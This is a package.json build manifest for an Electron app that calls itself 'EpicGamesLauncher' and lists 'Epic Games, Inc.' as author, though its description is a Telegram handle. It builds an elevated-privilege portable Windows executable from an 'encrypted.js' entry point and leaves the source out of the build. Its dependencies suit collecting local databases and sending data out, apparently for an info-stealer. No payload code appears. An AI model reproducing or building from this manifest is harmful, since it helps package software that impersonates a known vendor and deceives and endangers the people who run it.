{
  "name": "EpicGamesLauncher",
  "version": "1.0.0",
  "description": "t.me/doenerium69",
  "main": "encrypted.js",
  "author": "Epic Games, Inc.",
  "license": "MIT",
  "scripts": {
    "start": "sudo electron .",
    "electron-builder": "electron-builder --win"
  },
  "build": {
    "win": {
      "icon": "icon.ico",
      "requestedExecutionLevel": "highestAvailable",
      "files": [
        "!source/",
        "!build/",
        "!icon.ico",
        "!install.bat"
      ],
      "target": [
        {
          "target": "portable",
          "arch": [
            "x64"
          ]
        }
      ]
    },
    "directories": {
      "output": "build"
    }
  },
  "dependencies": {
    "adm-zip": "^0.5.10",
    "axios": "^1.6.3",
    "crypto": "^1.0.1",
    "os": "^0.1.2",
    "sqlite3": "^5.1.6"
  },
  "devDependencies": {
    "electron": "^23.0.0",
    "electron-builder": "^23.6.0"
  }
}
